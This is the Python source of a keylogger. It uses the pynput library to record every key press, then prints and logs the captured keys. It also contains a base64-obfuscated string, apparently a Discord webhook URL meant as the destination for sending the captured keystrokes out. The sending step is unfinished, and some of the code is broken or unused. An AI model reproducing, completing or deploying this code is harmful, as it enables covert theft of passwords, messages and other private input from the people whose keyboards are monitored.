try:
    import logging
    from pynput.keyboard import Key, Listener
except:
    raise "Import Failed"


class Keylogger:

    def __init__(self):
        super(Keylogger, self).__init__()

        self.pressed_keys = []

    async def payload_to_server(self, message):
        payload = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3OTQwMjQ1NjQzMzgyMzgwNi9mX1FEN05hWHViOU5RSWlWajJVYU05VzEtMGN5RG12UGgzRmZYOUZFYjVJbDFOLTdfWnlva1pvUEFfU3kxeFlFd3d4bQ=="
        parameters = {
            "username": "Keylogger",
            "content": message,
        }

    def log(self):
        with Listener(on_press=self.keyboard_pressed) as listener:
            listener.join()

    def keyboard_pressed(self, key):
        self.pressed_keys.append(str(key))

        x = f"Keyboard Pressed => {str(key)}"

        print(self.pressed_keys)

        logging.info(x)


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.log()
